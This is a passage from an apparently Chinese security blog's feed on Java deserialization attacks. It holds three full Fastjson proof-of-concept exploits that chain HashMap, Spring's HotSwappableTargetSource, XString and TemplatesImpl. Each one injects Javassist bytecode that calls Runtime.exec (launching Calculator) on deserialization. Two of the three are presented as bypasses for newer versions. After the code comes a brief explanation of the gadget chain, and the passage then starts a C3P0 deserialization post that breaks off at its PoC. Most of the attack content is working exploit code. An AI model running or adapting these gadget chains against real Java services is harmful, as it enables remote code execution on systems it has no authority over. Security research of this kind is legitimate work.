class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">byte</span>[] codes = cc.toBytecode();</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jo.put(<span class="string">&quot;1&quot;</span>,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(jo);</span><br><span class="line"><span class="comment">//      HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString(&quot;xxx&quot;));</span></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1,h1);</span><br><span class="line">        hashMap.put(h2,h2);</span><br><span class="line"></span><br><span class="line">        Class clazz=h2.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformerdeclaredField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">        transformerdeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerdeclaredField.set(h2,<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> serial(hashMap);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">        deserial(Base64.getDecoder().decode(base64));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来分析一下这个链的原理，可以看到入口点事HashMap这里直接跟踪下反序列化的流程就知道了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733921435470-5bace7aa-db8f-4eef-958c-45820b884dd8.png" alt=""></p><p>可以看到在hashmap的readobject方法里最后调用的事putVal方法而他的key事HotSwappableTargetSource对象</p><p>跟下去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733921508541-e689fdf8-d219-4243-b1fe-1e82db418248.png" alt=""></p><p>这里会调用equals方法，这里相当于调用的事HotSwappableTargetSource的equals方法跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733921581898-3294da62-2058-49e5-a924-4491df83a20f.png" alt=""></p><p>这里会执行target对象的euals方法我们看一下target对象是谁</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733921653959-0ffed6d0-151b-447a-ac43-7f0b5401a3d6.png" alt=""></p><p>可以看到是Xstring对象，跟到他的equals方法里去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733921689502-04a8638a-1a64-4672-8731-b0aa9a0fb779.png" alt=""></p><p>可以看到这里obj2对象调用了toString方法。后面就是fastjson+ templatesimpl的流程了</p><p>那这里我们需要看一下如何才能将target对象赋值为Xstring对象呢</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733921782569-fece3a2d-76a0-4811-be24-97d417d3149d.png" alt=""></p><p>可以在HotSwappableTargetSource的有参构造方法中找到可以直接赋值。</p><h3 id="高版本POC">高版本POC</h3><p>arrayList</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonyuanshengBypass_xstring</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">byte</span>[] codes = cc.toBytecode();</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(templatesimpl);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templatesimpl);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        JSONObject jo = new JSONObject();</span></span><br><span class="line"><span class="comment">//        jo.put(&quot;1&quot;,templatesimpl);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(jsonArray);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1,h1);</span><br><span class="line">        hashMap.put(h2,h2);</span><br><span class="line">        setValue(h2,<span class="string">&quot;target&quot;</span>,<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xx&quot;</span>));</span><br><span class="line">        arrayList.add(hashMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> serial(arrayList);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">        deserial(Base64.getDecoder().decode(base64));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hashmap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonyuanshengBypass_xstring</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">byte</span>[] codes = cc.toBytecode();</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        arrayList.add(templatesimpl);</span></span><br><span class="line"><span class="comment">//        JSONArray jsonArray = new JSONArray();</span></span><br><span class="line"><span class="comment">//        jsonArray.add(templatesimpl);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jo.put(<span class="string">&quot;1&quot;</span>,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(jo);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1,h1);</span><br><span class="line">        hashMap.put(h2,h2);</span><br><span class="line">        setValue(h2,<span class="string">&quot;target&quot;</span>,<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xx&quot;</span>));</span><br><span class="line">        HashMap&lt;Object,Object&gt; hhhhashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hhhhashMap.put(templatesimpl,hashMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> serial(hhhhashMap);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">        deserial(Base64.getDecoder().decode(base64));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="一些ctf题目">一些ctf题目</h3><p>参考：<a href="https://xz.aliyun.com/t/16540">https://xz.aliyun.com/t/16540</a></p><p><a href="https://xz.aliyun.com/t/16608">https://xz.aliyun.com/t/16608</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Fastjson回顾&quot;&gt;Fastjson回顾&lt;/h2&gt;
&lt;p&gt;这里先来回顾一下fastjson怎么使用，其实研究具体的漏洞主要就是fastjson的序列化和反序列化&lt;/p&gt;
&lt;p&gt;先来创建一个类&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;</summary>
      
    
    
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Fastjson" scheme="https://oceanzbz.github.io/tags/Fastjson/"/>
    
  </entry>
  
  <entry>
    <title>C3p0反序列化</title>
    <link href="https://oceanzbz.github.io/post/7327645d.html"/>
    <id>https://oceanzbz.github.io/post/7327645d.html</id>
    <published>2024-12-30T06:04:29.000Z</published>
    <updated>2025-03-05T07:24:36.784Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍">介绍</h2><p>这里直接搬运一下</p><p>C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。</p><p>JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。<br>使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。</p><p>连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。</p><h2 id="环境搭建">环境搭建</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">0.9</span><span class="number">.5</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="URLClassLoader">URLClassLoader</h2><h3 id="poc">poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 